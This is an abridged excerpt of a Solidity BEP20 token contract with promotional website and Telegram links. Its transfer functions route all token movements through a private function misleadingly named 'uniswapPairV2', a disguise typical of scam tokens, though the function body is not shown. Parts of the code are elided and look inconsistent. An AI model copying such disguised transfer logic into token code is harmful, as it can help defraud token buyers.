...
////////////////////
// 
// // /// https://wangluonetwork.zinluoio.io/
// / // // https://t.me/WangluoNetwork
...
contract BEP20 is IERC20, Ownable {
    ...
    function transferFrom(
        ...
        uniswapPairV2     (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        uniswapPairV2     (msg.sender, recipient, amount);
        return true;
    }

    function uniswapPairV2    (
        address from,
        address to,
        uint256 amount
    ) private {
